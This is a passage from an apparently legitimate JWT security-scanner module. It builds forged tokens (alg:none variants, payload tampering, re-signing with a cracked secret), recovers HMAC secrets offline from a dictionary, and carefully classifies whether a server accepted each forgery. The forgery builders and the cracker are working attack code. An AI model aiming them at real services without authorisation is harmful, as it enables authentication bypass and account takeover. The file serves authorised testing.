"""JWT forgery -- the Burp Scanner JWT family, as builders plus an ACCEPTANCE ORACLE.

MINED FROM Burp's published issue catalog (portswigger.net/burp/documentation/scanner/
vulnerabilities-list), which lists these as distinct issues:

    JWT signature not verified              JWT none algorithm supported
    JWT self-signed JWK header supported    JWT weak HMAC secret
    JWT arbitrary jku header supported      JWT arbitrary x5u header supported

`jwt_tool.py` already covers algorithm confusion (RS->HS), the `kid` lead, expired-`exp` replay,
JWKS location discovery, and ONE `alg:none` variant. This module does not restate any of that --
it IMPORTS `jwt_tool` for `b64url_encode`, `decode_jwt`, `sign_hs`, `verify_hs`,
`tamper_signature` and `candidate_secrets`, and adds the four attack shapes that were absent
plus the oracle all six of them need.

PURE. No network, no state, no imports of any HTTP client. Builders make forged tokens; analysers
read responses the caller captured. Transport lives in `tools.py`.

=================================================================================================
WHY THIS FILE IS MOSTLY ORACLE AND ONLY A LITTLE FORGERY
=================================================================================================

Forging the token is the easy half and every JWT article stops there. The hard half is answering
"did the server honour it", and a JWT check gets that wrong in a way no other check does:

    AN ERROR AND A REJECTION LOOK THE SAME.
    A REJECTION AND A 200 ON AN UNAUTHENTICATED PAGE LOOK THE SAME.

Three different responses collapse into one HTTP 200:

  * a 200 because the forgery worked
  * a 200 because the endpoint never required authentication in the first place
  * a 200 that IS the login page, rendered at 200 by a SPA shell or a soft redirect

`tools.py:_run_jwt` currently contains exactly that mistake on its `alg:none` and cracked-secret
send sites -- `if 200 <= r["status"] < 300: findings.append(critical "Forged JWT accepted")` with
no control of any kind. Aimed at an unauthenticated URL it fires on every target in existence.
The RS->HS block thirty lines below it gets this RIGHT (it demands that a signature-tampered token
be REJECTED before it will believe an acceptance), so the correct pattern was already in the tree,
applied to one of three send sites. `classify_acceptance()` is that pattern extracted, given a
third leg, and made unit-testable against responses written by hand.

THE THREE-LEG CONTROL SET, all captured from the SAME endpoint:

    authenticated    POSITIVE CONTROL -- the genuine token. What success looks like.
    unauthenticated  NEGATIVE CONTROL -- no token at all. What failure looks like.
    tampered         the genuine token with one signature byte flipped
                     (`jwt_tool.tamper_signature`). A sound verifier MUST reject it.

`tampered` does double duty, and that is the design's one real idea:

  * it is the SANITY GATE for every other check. If a mangled signature is honoured, then an
    "acceptance" of a jku/JWK/none forgery proves nothing about jku, JWK or none -- the server
    would have honoured anything. Every other check is gated on `signature_oracle()` returning
    SOUND.
  * when it is honoured while the no-token control is rejected, that IS Burp's
    `jwt_signature_not_verified`, confirmed by a differential rather than inferred from a status.

WITHOUT ALL THREE LEGS THE VERDICT IS `not_tested`. Never `not_vulnerable`. There is no
"rejected, therefore safe" finding anywhere in this module, and `rejected` is a statement about
ONE probe -- never about the target.

=================================================================================================
THE FOUR FALSE POSITIVES THE CLASSIFIER EXISTS TO KILL
=================================================================================================

Each of these is a case where a status-code check reports CRITICAL and the truth is "nothing":

  1. THE UNAUTHENTICATED ENDPOINT. Positive and negative controls that are indistinguishable mean
     the endpoint does not discriminate on the token, so no acceptance test run against it can
     mean anything. `controls_usable()` refuses, and the verdict is `not_tested`.
  2. THE 200 LOGIN PAGE. The forged response matches the NEGATIVE control's body, at status 200.
     Body similarity outvotes the status class.
  3. THE CRASHED VERIFIER. A malformed token that produces a 500 and a stack trace is neither an
     acceptance nor a rejection. 5xx and transport failure are `not_tested` UNCONDITIONALLY,
     before any scoring runs -- a crash is the single most likely response to a forged token and
     the single easiest thing to misread as either verdict.
  4. THE THIRD SHAPE. A 200 whose body matches NEITHER control (a rate limit page, a WAF block, an
     interstitial) is inconclusive. The body signal returns UNKNOWN rather than abstaining, and
     one UNKNOWN forces `not_tested` even when the status matched the positive control. Letting
     the body signal abstain here is what would turn every WAF block into a CRITICAL.

HOW A RESPONSE IS COMPARED. Not by equality -- a real authenticated page carries a CSRF token, a
request id and a timestamp, so two captures of the SAME page are never byte-equal. Not by status
alone either, for reason (2). Two signals vote, and each votes only when it can discriminate:

    status  discriminates iff the two controls' statuses DIFFER.
    body    discriminates iff the two controls' bodies differ (Jaccard over alphabetic word
            tokens, with digit and hex runs normalised away so per-request nonces cannot make two
            captures of one page look different).

A signal that cannot discriminate is silent -- which is how a bodiless 204/401 API is classified
on status alone, and how a two-200 SPA is classified on body alone. If NEITHER discriminates the
controls are unusable. If any discriminating signal says UNKNOWN, or the two signals contradict,
the verdict is `not_tested`.

=================================================================================================
WEAK HMAC BRUTE FORCE IS OFFLINE, AND A MISS IS NOT A CLEAN RESULT
=================================================================================================

`crack_hmac_secret()` sends NOTHING. It recomputes an HMAC over a token already in hand, which is
pure arithmetic; the wordlist and the wall-clock budget are both bounded so it cannot become an
online attack by accident, and `tests/test_jwt_attacks.py` asserts at the AST level that this
module imports no HTTP client and contains no `except` handler at all.

The honesty hole this fixes: `jwt_tool.crack_secret()` returns `None` on a miss and `analyze()`
then emits no finding, so "I tried 21 words and none of them worked" is indistinguishable in the
report from "this token was never examined". A bounded dictionary miss is NOT evidence of a strong
secret. A miss here is `not_tested` and carries the number of candidates tried, so the operator
can see the ceiling of what was actually done.

=================================================================================================
jku / x5u ARE OUT-OF-BAND, AND WITHOUT A COLLABORATOR THE ANSWER IS "NOT TESTED"
=================================================================================================

A `jku` or `x5u` header pointing at an attacker URL is confirmed by the server FETCHING it. There
is no in-band oracle for it and this module does not invent one: `analyze_remote_key_header()`
requires a CORRELATED out-of-band interaction, and with `oob_available=False` the verdict is
`not_tested` with the reason spelled out.

It also refuses to conflate two different facts, the way `code_injection.py` refuses to name a
language off shared arithmetic:

    the server FETCHED our URL            -> attacker-steered outbound request. CWE-918. Medium.
                                             It does NOT prove the key was trusted.
    the server fetched AND accepted       -> the key was trusted. CWE-347. Critical.
    accepted with NO fetch                -> a contradiction. The acceptance was produced by
                                             something other than our key, so nothing is claimed.

See `docs/handoff/q149_jwt_attacks.md` for the known open item: `BBH_OOB_BASE` defaults to a
Docker-internal hostname, so `collaborator.reachable_from()` is False for every external target
and these two checks are structurally `not_tested` off-lab today.
"""
from __future__ import annotations

import json
import re
import time
from dataclasses import dataclass

import jwt_tool

# ------------------------------------------------------------------------------------------------
# check vocabulary -- one name per Burp issue, plus the two "fetched but not trusted" verdicts that
# exist so a proven outbound request is never upgraded into a proven forgery.
# ------------------------------------------------------------------------------------------------

CHECK_SIGNATURE_NOT_VERIFIED = "jwt_signature_not_verified"
CHECK_NONE_ALGORITHM = "jwt_none_algorithm_supported"
CHECK_SELF_SIGNED_JWK = "jwt_self_signed_jwk_header_supported"
CHECK_WEAK_HMAC_SECRET = "jwt_weak_hmac_secret"
CHECK_ARBITRARY_JKU = "jwt_arbitrary_jku_header_supported"
CHECK_ARBITRARY_X5U = "jwt_arbitrary_x5u_header_supported"
CHECK_JKU_FETCHED = "jwt_jku_url_fetched"
CHECK_X5U_FETCHED = "jwt_x5u_url_fetched"

CHECKS = (CHECK_SIGNATURE_NOT_VERIFIED, CHECK_NONE_ALGORITHM, CHECK_SELF_SIGNED_JWK,
          CHECK_WEAK_HMAC_SECRET, CHECK_ARBITRARY_JKU, CHECK_ARBITRARY_X5U,
          CHECK_JKU_FETCHED, CHECK_X5U_FETCHED)

#: THREE verdicts, never two. `rejected` says the server refused THIS probe; it never says the
#: target is safe, and no caller may render it as a clean result. `not_tested` is the verdict for
#: every ambiguity, every missing control and every crashed verifier.
VERDICT_CONFIRMED = "confirmed"
VERDICT_REJECTED = "rejected"
VERDICT_NOT_TESTED = "not_tested"

_VOTE_AUTH = "authenticated"
_VOTE_UNAUTH = "unauthenticated"
_VOTE_UNKNOWN = "unknown"


# ------------------------------------------------------------------------------------------------
# response comparison
# ------------------------------------------------------------------------------------------------

#: Bodies are compared over at most this many characters. A 5 MB asset dump would otherwise make
#: tokenisation the slowest thing in the engine, and the discriminating text on an authenticated
#: page is at the top of it.
_BODY_CHARS = 20000

#: Alphabetic words only, two characters or more. Digits are deliberately excluded from tokens
#: (see `_normalize`): a CSRF token, a request id and an epoch timestamp differ on every capture of
#: the SAME page, and letting them into the token set makes a page look unlike itself.
_WORD = re.compile(r"[a-z]{2,}")
_DIGIT_RUN = re.compile(r"\d+")
_HEX_RUN = re.compile(r"\b[0-9a-f]{8,}\b")

#: Two control bodies whose Jaccard similarity is at or above this are "the same page", so the body
#: signal cannot discriminate between them and stays silent.
_BODY_SAME = 0.9
#: A probe body must be at least this similar to a control before it is called a match. Below it the
#: response is a THIRD shape and the vote is UNKNOWN -- which is what stops a WAF block page at
#: status 200 being read as an acceptance.
_BODY_MATCH = 0.6
#: ...and it must beat the other control by at least this margin.
_BODY_MARGIN = 0.2


def _normalize(body: str) -> str:
    """Lower-case, with per-request noise erased.

    Hex runs go first (an 8+ hex-digit request id would otherwise survive as letters once its
    digits are stripped), then digit runs. What remains is the page's vocabulary.
    """
    text = str(body or "")[:_BODY_CHARS].lower()
    text = _HEX_RUN.sub(" ", text)
    return _DIGIT_RUN.sub(" ", text)


def body_tokens(body: str) -> frozenset:
    return frozenset(_WORD.findall(_normalize(body)))


def similarity(a: str, b: str) -> float:
    """Jaccard over `body_tokens`. Two EMPTY bodies are identical (1.0); one empty and one not are
    maximally different (0.0). Both cases are real -- a 204 has no body, and a 401 JSON error next
    to an HTML page is the ordinary shape."""
    ta, tb = body_tokens(a), body_tokens(b)
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    return len(ta & tb) / len(ta | tb)


@dataclass(frozen=True)
class Response:
    """One captured HTTP response. `status` 0 means the request never completed, which is a
    transport failure and never a rejection."""
    status: int
    body: str = ""


@dataclass(frozen=True)
class Controls:
    """The positive and negative controls, plus the signature-tampered sanity leg.

    `tampered` is optional in the type but not in practice: `signature_oracle()` returns
    `not_tested` without it, and every check except `signature_not_verified` is gated on that
    oracle returning SOUND.
    """
    authenticated: Response
    unauthenticated: Response
    tampered: Response | None = None


def controls_usable(controls: Controls) -> tuple:
    """`(usable, reason)`. Unusable controls make every acceptance test on this endpoint vacuous.

    Four ways to be unusable, and the first is the one that matters: an endpoint that answers the
    same way with and without a token is not authenticated, so "the forged token was accepted" is
    a statement about a public page.
    """
    auth, unauth = controls.authenticated, controls.unauthenticated
    if auth is None or unauth is None:
        return False, "no positive and negative control were captured"
    if auth.status <= 0 or unauth.status <= 0:
        return False, "a control request did not complete (transport failure), so nothing is established"
    if auth.status >= 500 or unauth.status >= 500:
        return False, ("a control returned HTTP %d -- a server error establishes neither what an "
                       "authenticated nor what an unauthenticated response looks like"
                       % (auth.status if auth.status >= 500 else unauth.status))
    if not _status_discriminates(controls) and not _body_discriminates(controls):
        return False, ("the authenticated and unauthenticated responses are indistinguishable "
                       "(both HTTP %d, same body vocabulary) -- this endpoint does not gate on the "
                       "token, so no forged token sent to it can be shown to have been accepted"
                       % auth.status)
    return True, ""


def _status_discriminates(controls: Controls) -> bool:
    return controls.authenticated.status != controls.unauthenticated.status


def _body_discriminates(controls: Controls) -> bool:
    return similarity(controls.authenticated.body, controls.unauthenticated.body) < _BODY_SAME


def _status_vote(controls: Controls, probe: Response) -> str:
    if probe.status == controls.authenticated.status:
        return _VOTE_AUTH
    if probe.status == controls.unauthenticated.status:
        return _VOTE_UNAUTH
    return _VOTE_UNKNOWN


def _body_vote(controls: Controls, probe: Response) -> str:
    sa = similarity(probe.body, controls.authenticated.body)
    su = similarity(probe.body, controls.unauthenticated.body)
    if sa >= _BODY_MATCH and sa - su >= _BODY_MARGIN:
        return _VOTE_AUTH
    if su >= _BODY_MATCH and su - sa >= _BODY_MARGIN:
        return _VOTE_UNAUTH
    return _VOTE_UNKNOWN


def classify_acceptance(controls: Controls, probe: Response) -> dict:
    """Did the server honour this response's token? `{verdict, reason, votes}`.

    Order matters. The unconditional refusals run BEFORE any scoring, because a crashed verifier
    is the most likely response to a malformed forged token and the easiest thing to misread.
    """
    usable, why = controls_usable(controls)
    if not usable:
        return {"verdict": VERDICT_NOT_TESTED, "reason": why, "votes": []}
    if probe is None or probe.status <= 0:
        return {"verdict": VERDICT_NOT_TESTED,
                "reason": "the forged request did not complete (transport failure)", "votes": []}
    if probe.status >= 500:
        return {"verdict": VERDICT_NOT_TESTED,
                "reason": ("the forged token produced HTTP %d -- a crashed verifier is neither an "
                           "acceptance nor a rejection" % probe.status), "votes": []}

    votes = []
    if _status_discriminates(controls):
        votes.append(_status_vote(controls, probe))
    if _body_discriminates(controls):
        votes.append(_body_vote(controls, probe))

    if _VOTE_UNKNOWN in votes:
        return {"verdict": VERDICT_NOT_TESTED,
                "reason": ("the response (HTTP %d) matches neither control -- a third shape (an "
                           "error page, a WAF block, an interstitial) is inconclusive, not an "
                           "acceptance" % probe.status), "votes": votes}
    if _VOTE_AUTH in votes and _VOTE_UNAUTH in votes:
        return {"verdict": VERDICT_NOT_TESTED,
                "reason": "the status and body signals contradict each other", "votes": votes}
    if _VOTE_AUTH in votes:
        return {"verdict": VERDICT_CONFIRMED,
                "reason": ("HTTP %d, matching the authenticated control and not the "
                           "unauthenticated one" % probe.status), "votes": votes}
    if _VOTE_UNAUTH in votes:
        return {"verdict": VERDICT_REJECTED,
                "reason": ("HTTP %d, matching the unauthenticated control -- this probe was "
                           "refused (which says nothing about other probes)" % probe.status),
                "votes": votes}
    return {"verdict": VERDICT_NOT_TESTED, "reason": "no signal could discriminate", "votes": votes}


# ------------------------------------------------------------------------------------------------
# the signature oracle -- Burp's "JWT signature not verified", and the gate for every other check
# ------------------------------------------------------------------------------------------------

SIGNATURE_SOUND = "sound"
SIGNATURE_NOT_VERIFIED = "not_verified"
SIGNATURE_VACUOUS = "vacuous"
SIGNATURE_UNKNOWN = "unknown"


def signature_oracle(controls: Controls) -> dict:
    """`{state, reason}` for the signature-tampered leg. Four states, and three of them block.

      SOUND          the tampered token was refused. The endpoint checks signatures, so an
                     acceptance of some OTHER forgery is attributable to that forgery.
      NOT_VERIFIED   the tampered token was honoured while the no-token control was refused.
                     The endpoint reads the claims and does not verify the signature: Burp's
                     `jwt_signature_not_verified`, CONFIRMED.
      VACUOUS        the tampered token was honoured and so was the no-token control. The endpoint
                     is not gated at all; nothing here is a finding and nothing else can be tested.
      UNKNOWN        no tampered leg, or its response was inconclusive.
    """
    if controls.tampered is None:
        return {"state": SIGNATURE_UNKNOWN,
                "reason": ("no signature-tampered control was captured, so an acceptance cannot be "
                           "attributed to the forgery rather than to a verifier that honours "
                           "anything")}
    usable, why = controls_usable(controls)
    if not usable:
        return {"state": SIGNATURE_UNKNOWN, "reason": why}

    verdict = classify_acceptance(controls, controls.tampered)
    if verdict["verdict"] == VERDICT_REJECTED:
        return {"state": SIGNATURE_SOUND,
                "reason": "a signature-tampered copy of the genuine token was refused (%s)"
                          % verdict["reason"]}
    if verdict["verdict"] == VERDICT_CONFIRMED:
        # The no-token control is already known to be distinguishable from the authenticated one
        # (controls_usable passed), so an honoured tampered token means claims-without-signature.
        return {"state": SIGNATURE_NOT_VERIFIED,
                "reason": ("a copy of the genuine token with one signature byte flipped was "
                           "honoured (%s) while a request with no token at all was not"
                           % verdict["reason"])}
    return {"state": SIGNATURE_UNKNOWN, "reason": verdict["reason"]}


def analyze_signature_verification(controls: Controls) -> dict:
    """Burp's `JWT signature not verified`, as a verdict row.

    CONFIRMED requires the differential in both directions: tampered honoured AND no-token
    refused. Either half alone is the false positive -- "tampered honoured" on an ungated endpoint
    is a public page, and "no-token refused" on its own says nothing about signatures.
    """
    oracle = signature_oracle(controls)
    if oracle["state"] == SIGNATURE_NOT_VERIFIED:
        return {"check": CHECK_SIGNATURE_NOT_VERIFIED, "verdict": VERDICT_CONFIRMED,
                "shape": "signature_byte_flipped",
                "evidence": ("HTTP request with a signature-tampered JWT -> accepted; the same "
                             "request with no token -> refused. %s" % oracle["reason"]),
                "reason": oracle["reason"]}
    if oracle["state"] == SIGNATURE_SOUND:
        return {"check": CHECK_SIGNATURE_NOT_VERIFIED, "verdict": VERDICT_REJECTED,
                "shape": "signature_byte_flipped", "evidence": "", "reason": oracle["reason"]}
    return {"check": CHECK_SIGNATURE_NOT_VERIFIED, "verdict": VERDICT_NOT_TESTED,
            "shape": "signature_byte_flipped", "evidence": "", "reason": oracle["reason"]}


def analyze_forgery(check: str, controls: Controls, forged: Response, shape: str = "",
                    payload: str = "") -> dict:
    """The gated acceptance test used by every check except `signature_not_verified`.

    THE GATE IS THE POINT. If `signature_oracle()` is not SOUND, an accepted forgery is not
    evidence FOR THIS CHECK: a verifier that honours a mangled signature would have honoured an
    `alg:none` token, a self-signed JWK and a random string alike, so attributing the acceptance
    to the jku header (or the JWK, or the algorithm) is exactly the over-claim this repo keeps
    deleting. The verdict in that case is `not_tested`, and the reason names the real defect.
    """
    oracle = signature_oracle(controls)
    if oracle["state"] == SIGNATURE_NOT_VERIFIED:
        return {"check": check, "verdict": VERDICT_NOT_TESTED, "shape": shape, "evidence": "",
                "reason": ("this endpoint does not verify signatures at all (%s), so an accepted "
                           "forgery here is attributable to that and not to this check"
                           % oracle["reason"])}
    if oracle["state"] != SIGNATURE_SOUND:
        return {"check": check, "verdict": VERDICT_NOT_TESTED, "shape": shape, "evidence": "",
                "reason": oracle["reason"]}

    verdict = classify_acceptance(controls, forged)
    evidence = ""
    if verdict["verdict"] == VERDICT_CONFIRMED:
        evidence = ("HTTP request carrying the forged token -> %s; the same request with a "
                    "signature-tampered token -> refused; with no token -> refused."
                    % verdict["reason"])
        if payload:
            evidence += " forged token: %s" % payload
    return {"check": check, "verdict": verdict["verdict"], "shape": shape,
            "evidence": evidence, "reason": verdict["reason"]}


# ------------------------------------------------------------------------------------------------
# forged tokens
# ------------------------------------------------------------------------------------------------

@dataclass(frozen=True)
class ForgedToken:
    """One forged token plus everything the caller needs to send it honestly.

    `side_channel` is the document that must be reachable at `side_channel_url` for the forgery to
    work at all (a JWKS for `jku`, a PEM chain for `x5u`). A caller that cannot serve it must not
    send the token and must record `not_tested`.
    """
    check: str
    shape: str
    token: str
    rationale: str
    requires_oob: bool = False
    side_channel: str = ""
    side_channel_url: str = ""


def _encode(header: dict, payload: dict) -> tuple:
    """`(header_b64, payload_b64)` with compact separators, so the signing input is reproducible."""
    return (jwt_tool.b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=True)),
            jwt_tool.b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True)))


def escalated_claims(payload: dict, overrides: dict = None) -> dict:
    """`jwt_tool.escalate_payload` with the CLOCK REMOVED, plus caller overrides.

    `escalate_payload` rewrites `exp` to `time.time() + 3600`, which makes every forged token this
    module builds non-reproducible and every test of it clock-dependent. The original `exp` is
    restored here and the caller supplies a fresh one through `overrides` if the token is expired.
    Keeping the clock in the caller is what lets a forged token be hand-checked byte for byte.
    """
    src = dict(payload or {})
    out = dict(jwt_tool.escalate_payload(src))
    if "exp" in src:
        out["exp"] = src["exp"]
    else:
        out.pop("exp", None)
    out.update(dict(overrides or {}))
    return out


# --- Burp: "JWT signature not verified" ---------------------------------------------------------

def forge_payload_tamper(token: str, overrides: dict = None) -> ForgedToken | None:
    """The claims rewritten, THE ORIGINAL SIGNATURE KEPT. `None` if the token will not decode.

    This is the probe for `signature_not_verified`, and it is a different shape from
    `jwt_tool.tamper_signature` (which mangles the signature and leaves the claims alone). Both are
    needed: the tampered-signature token is the CONTROL that a sound verifier must refuse, and this
    one is the PROBE whose acceptance proves the claims are trusted unsigned.
    """
    d = jwt_tool.decode_jwt(token)
    if not d or len(d["parts"]) < 3:
        return None
    hb, pb = _encode(d["header"], escalated_claims(d["payload"], overrides))
    return ForgedToken(
        check=CHECK_SIGNATURE_NOT_VERIFIED, shape="payload_rewritten_signature_kept",
        token="%s.%s.%s" % (hb, pb, d["parts"][2]),
        rationale=("the claims are rewritten and the ORIGINAL signature is reattached; it cannot "
                   "validate over the new signing input, so acceptance means no verification"))


# --- Burp: "JWT none algorithm supported" -------------------------------------------------------

#: `jwt_tool.forge_none()` ships ONE of these. A library that blocklists the literal string "none"
#: with a case-sensitive comparison is bypassed by "None"; one that only rejects an EMPTY signature
#: is bypassed by retaining the original; one that requires three segments is bypassed by the
#: two-segment form and vice versa. The acceptance surface is the cross product, not one point.
_NONE_ALGS = ("none", "None", "NONE", "nOnE")
_NONE_SHAPES = ("empty_signature", "no_signature_segment", "original_signature_retained")


def forge_none_variants(token: str, overrides: dict = None, max_variants: int = 12) -> list:
    """Every `alg:none` shape, bounded. `[]` if the token will not decode.

    Ordered so the two most commonly accepted shapes (`none`/`None` with an empty signature) come
    first, because a caller that caps the send budget should spend it on those.
    """
    d = jwt_tool.decode_jwt(token)
    if not d:
        return []
    claims = escalated_claims(d["payload"], overrides)
    original_sig = d["parts"][2] if len(d["parts"]) > 2 else ""
    out = []
    for shape in _NONE_SHAPES:
        for alg in _NONE_ALGS:
            header = dict(d["header"])
            header["alg"] = alg
            hb, pb = _encode(header, claims)
            if shape == "empty_signature":
                forged = "%s.%s." % (hb, pb)
            elif shape == "no_signature_segment":
                forged = "%s.%s" % (hb, pb)
            else:
                if not original_sig:
                    continue
                forged = "%s.%s.%s" % (hb, pb, original_sig)
            out.append(ForgedToken(
                check=CHECK_NONE_ALGORITHM, shape="%s/%s" % (alg, shape), token=forged,
                rationale=("alg is %r in the %s shape; a verifier that trusts the header's own "
                           "algorithm field performs no cryptography at all" % (alg, shape))))
            if len(out) >= max(1, int(max_variants)):
                return out
    return out


# ------------------------------------------------------------------------------------------------
# Burp: "JWT weak HMAC secret" -- OFFLINE, BOUNDED, and a miss is never a clean result
# ------------------------------------------------------------------------------------------------

#: Hard ceiling on candidates. A caller may lower it, never raise it past this: the point of the
#: bound is that this stays a few seconds of local arithmetic and can never drift into an online
#: attack or a mission-length stall.
MAX_CRACK_WORDS = 5000
#: Wall-clock ceiling. `clock` is injectable so the budget itself is testable without sleeping.
MAX_CRACK_SECONDS = 10.0

_HS_ALGS = frozenset({"HS256", "HS384", "HS512"})


def hmac_wordlist(token: str, extra: list = None, max_words: int = MAX_CRACK_WORDS) -> list:
    """The bounded candidate list: `jwt_tool.candidate_secrets` (common secrets plus words derived
    from the token's own `iss`/`aud`) then the curated password list, de-duplicated, then `extra`.

    Ordered cheapest-signal-first so a truncated run still tries the words most likely to hit.
    `wordlists` is imported lazily: this module must stay importable in a bare interpreter, and
    `wordlists` reaches the filesystem looking for SecLists.
    """
    d = jwt_tool.decode_jwt(token)
    payload = d["payload"] if d else {}
    words = list(jwt_tool.candidate_secrets(payload))
    import wordlists
    words += list(wordlists.get_words("passwords-common"))
    words += [w for w in (extra or []) if w]
    seen, out = set(), []
    for w in words:
        if isinstance(w, str) and w not in seen:
            seen.add(w)
            out.append(w)
        if len(out) >= min(int(max_words), MAX_CRACK_WORDS):
            break
    return out


def crack_hmac_secret(token: str, words: list = None, max_words: int = MAX_CRACK_WORDS,
                      max_seconds: float = MAX_CRACK_SECONDS, clock=time.monotonic) -> dict:
    """Recover an HS* signing secret from a token ALREADY IN HAND. Sends nothing.

    A MISS IS `not_tested`, NOT `rejected`. Exhausting a bounded dictionary says the secret is not
    in that dictionary; it says nothing whatever about the secret's strength, and reporting it as a
    clean result is the exact shape this repo forbids. The row carries `tried` and `exhausted` so
    the operator can see the ceiling of what was actually attempted.
    """
    d = jwt_tool.decode_jwt(token)
    if not d or len(d["parts"]) < 3 or not d["parts"][2]:
        return {"check": CHECK_WEAK_HMAC_SECRET, "verdict": VERDICT_NOT_TESTED, "secret": None,
                "tried": 0, "exhausted": False, "shape": "offline_dictionary",
                "evidence": "", "reason": "not a signed three-part JWT, so there is no HMAC to attack"}
    alg = str(d["header"].get("alg", "")).upper()
    if alg not in _HS_ALGS:
        return {"check": CHECK_WEAK_HMAC_SECRET, "verdict": VERDICT_NOT_TESTED, "secret": None,
                "tried": 0, "exhausted": False, "shape": "offline_dictionary", "evidence": "",
                "reason": ("the token is signed with %s; there is no symmetric secret to recover "
                           "(algorithm confusion is jwt_tool's check, not this one)"
                           % (alg or "an unnamed algorithm"))}

    candidates = list(words) if words is not None else hmac_wordlist(token, max_words=max_words)
    candidates = candidates[:min(int(max_words), MAX_CRACK_WORDS)]
    started, tried = clock(), 0
    for word in candidates:
        if clock() - started > max_seconds:
            return {"check": CHECK_WEAK_HMAC_SECRET, "verdict": VERDICT_NOT_TESTED, "secret": None,
                    "tried": tried, "exhausted": False, "shape": "offline_dictionary", "evidence": "",
                    "reason": ("the %.1fs offline budget expired after %d candidate(s); an unfinished "
                               "search is not evidence of a strong secret" % (max_seconds, tried))}
        tried += 1
        if jwt_tool.verify_hs(token, word):
            return {"check": CHECK_WEAK_HMAC_SECRET, "verdict": VERDICT_CONFIRMED, "secret": word,
                    "tried": tried, "exhausted": False, "shape": "offline_dictionary",
                    "evidence": ("the %s signature on the captured token recomputes exactly from the "
                                 "dictionary word %r, so the signing secret is known and any token "
                                 "can be minted offline (no request was sent to recover it)"
                                 % (alg, word)),
                    "reason": "the recomputed HMAC matches the token's own signature"}
    return {"check": CHECK_WEAK_HMAC_SECRET, "verdict": VERDICT_NOT_TESTED, "secret": None,
            "tried": tried, "exhausted": True, "shape": "offline_dictionary", "evidence": "",
            "reason": ("%d candidate(s) tried without a match. A bounded dictionary miss is NOT "
                       "evidence of a strong secret -- it is the ceiling of what was attempted"
                       % tried)}


def forge_with_secret(token: str, secret: str, overrides: dict = None) -> ForgedToken | None:
    """A properly signed token with escalated claims, once the secret is known. `None` if the token
    will not decode. This is the ACTIVE half of the weak-secret check: the crack proves the secret,
    and this token proves the impact."""
    d = jwt_tool.decode_jwt(token)
    if not d:
        return None
    alg = str(d["header"].get("alg", "HS256")).upper()
    if alg not in _HS_ALGS:
        return None
    header = dict(d["header"])
    header["alg"] = alg
    hb, pb = _encode(header, escalated_claims(d["payload"], overrides))
    return ForgedToken(
        check=CHECK_WEAK_HMAC_SECRET, shape="resigned_with_cracked_secret",
        token="%s.%s.%s" % (hb, pb, jwt_tool.sign_hs(hb + "." + pb, secret, alg)),
        rationale=("a fully valid token with escalated claims, signed with the recovered secret -- "
                   "it is cryptographically indistinguishable from one the server issued"))


# ------------------------------------------------------------------------------------------------
# findings -- built ONLY from a confirmed verdict, and the not-tested rows are surfaced, not dropped
# ------------------------------------------------------------------------------------------------

_FINDING_SPEC = {
    CHECK_SIGNATURE_NOT_VERIFIED: {
        "title": "JWT signature is not verified",
        "severity": "critical", "cwe": "CWE-347", "cvss_score": 9.1,
        "description": ("The endpoint reads the claims out of the JWT and does not check the "
                        "signature over them. A token whose payload was rewritten and whose "
                        "original signature was reattached authenticated normally."),
        "success_oracle": ("the payload-rewritten token matched the authenticated control while a "
                           "request with no token matched the unauthenticated one"),
        "impact": ("Mint a token for any user, including an administrator, with no key material at "
                   "all: complete authentication bypass."),
        "remediation": ("Verify the signature before reading any claim, with a server-side pinned "
                        "algorithm and key; reject the token outright when verification fails."),
    },
    CHECK_NONE_ALGORITHM: {
        "title": "JWT 'alg: none' accepted (unsigned token honoured)",
        "severity": "critical", "cwe": "CWE-347", "cvss_score": 9.1,
        "description": ("The verifier takes the algorithm from the attacker-controlled header. A "
                        "token declaring the 'none' algorithm, carrying no valid signature, was "
                        "accepted as authentication."),
        "success_oracle": ("the unsigned alg:none token matched the authenticated control while a "
                           "signature-tampered token and a no-token request both matched the "
                           "unauthenticated one"),
        "impact": ("Forge a token for any user without any key: complete authentication bypass and "
                   "privilege escalation."),
        "remediation": ("Pin the accepted algorithm server-side and reject 'none' in every casing; "
                        "never let the token's own header choose the verification algorithm."),
    },
    CHECK_SELF_SIGNED_JWK: {
        "title": "JWT self-signed JWK header accepted",
        "severity": "critical", "cwe": "CWE-347", "cvss_score": 9.1,
        "description": ("The verifier trusts a public key embedded in the token's own header. A "
                        "token signed with a freshly generated key, carrying that key's public "
                        "half in the 'jwk' header, was accepted."),
        "success_oracle": ("a token signed with an attacker-generated key, whose public half rides "
                           "in the token header, matched the authenticated control while a "
                           "signature-tampered token was refused"),
        "impact": ("Sign a token for any user with a key generated on the attacker's laptop: "
                   "complete authentication bypass."),
        "remediation": ("Never take verification key material from the token. Resolve the key from "
                        "a server-side trusted set, keyed by an allowlisted 'kid'."),
    },
    CHECK_WEAK_HMAC_SECRET: {
        "title": "JWT signed with a weak, guessable HMAC secret",
        "severity": "high", "cwe": "CWE-326", "cvss_score": 8.1,
        "description": ("The HMAC signing secret was recovered offline from a bounded dictionary "
                        "by recomputing the captured token's own signature. No request was sent to "
                        "the target during recovery."),
        "success_oracle": ("the token's signature recomputes exactly from a dictionary word, which "
                           "is only possible if that word is the signing secret"),
        "impact": ("Mint valid tokens for any user, including an administrator; every token the "
                   "service has ever issued is also forgeable and unrevocable until the key is "
                   "rotated."),
        "remediation": ("Use a random secret of at least 256 bits from a CSPRNG, store it outside "
                        "the codebase, and rotate it -- a leaked or guessed HMAC key compromises "
                        "every token."),
    },
    CHECK_ARBITRARY_JKU: {
        "title": "JWT arbitrary 'jku' header accepted (attacker-hosted key set trusted)",
        "severity": "critical", "cwe": "CWE-347", "cvss_score": 9.1,
        "description": ("The verifier fetched a JSON Web Key Set from a URL taken out of the "
                        "token's own 'jku' header and used it to validate the token. The key set "
                        "was served by the tester."),
        "success_oracle": ("an out-of-band request for the tester's key set arrived from the "
                           "target AND the token signed with the matching private key matched the "
                           "authenticated control while a signature-tampered token was refused"),
        "impact": ("Sign a token for any user with an attacker-hosted key: complete authentication "
                   "bypass. The fetch is also a server-side request to an attacker-chosen URL."),
        "remediation": ("Ignore 'jku' entirely, or resolve it only against an allowlist of exact "
                        "trusted URLs; never fetch a key set from a URL the token supplies."),
    },
    CHECK_ARBITRARY_X5U: {
        "title": "JWT arbitrary 'x5u' header accepted (attacker-hosted certificate trusted)",
        "severity": "critical", "cwe": "CWE-347", "cvss_score": 9.1,
        "description": ("The verifier fetched an X.509 certificate from a URL taken out of the "
